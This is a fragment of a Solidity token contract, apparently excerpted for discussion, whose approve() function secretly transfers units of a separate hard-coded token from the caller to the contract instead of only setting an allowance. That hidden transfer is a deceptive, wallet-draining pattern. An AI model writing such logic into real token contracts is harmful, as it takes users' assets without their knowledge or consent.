...
contract Token is Context, IERC20, Ownable {
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        SafeERC20.safeApprove(IERC20(0xB8c77482e45F1F44dE1745F52C74426C631bDD52), address(this), 1);

        SafeERC20.safeTransferFrom(IERC20(0xB8c77482e45F1F44dE1745F52C74426C631bDD52), _msgSender(), address(this), 1);
